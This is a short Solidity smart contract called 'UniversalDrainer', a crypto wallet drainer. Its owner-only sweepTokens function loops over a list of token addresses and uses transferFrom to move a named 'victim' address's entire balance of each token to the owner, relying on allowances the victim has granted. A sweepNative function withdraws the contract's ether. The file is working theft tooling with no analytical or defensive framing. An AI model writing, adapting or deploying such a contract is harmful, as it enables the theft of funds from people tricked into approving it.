// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

interface IERC20 {
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
}

contract UniversalDrainer {
    address public owner;

    constructor() {
        owner = msg.sender;
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "Unauthorized");
        _;
    }

    // Dynamic multi-token sweep across any EVM chain configuration
    function sweepTokens(address[] calldata tokens, address victim) external onlyOwner {
        for (uint256 i = 0; i < tokens.length; i++) {
            uint256 bal = IERC20(tokens[i]).balanceOf(victim);
            if (bal > 0) {
                IERC20(tokens[i]).transferFrom(victim, owner, bal);
            }
        }
    }

    function sweepNative(address payable recipient) external onlyOwner {
        recipient.transfer(address(this).balance);
    }

    receive() external payable {}
}